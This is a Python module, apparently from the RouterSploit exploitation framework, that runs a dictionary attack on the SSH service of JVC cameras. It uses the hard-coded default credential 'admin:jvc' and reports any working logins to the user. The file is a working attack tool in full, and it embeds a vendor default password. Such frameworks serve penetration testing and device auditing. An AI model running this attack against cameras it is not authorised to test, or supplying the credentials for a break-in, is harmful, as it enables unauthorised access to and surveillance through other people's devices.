from routersploit.core.exploit import *
from routersploit.modules.creds.generic.ssh_default import Exploit as SSHDefault


class Exploit(SSHDefault):
    __info__ = {
        "name": "JVC Camera Default SSH Creds",
        "description": "Module performs dictionary attack against JVC Camera SSH service. "
                       "If valid credentials are found, they are displayed to the user.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "devices": (
            "JVC Camera",
        )
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(22, "Target SSH port")

    threads = OptInteger(1, "Number of threads")
    defaults = OptWordlist("admin:jvc", "User:pass or file with default credentials (file://)")
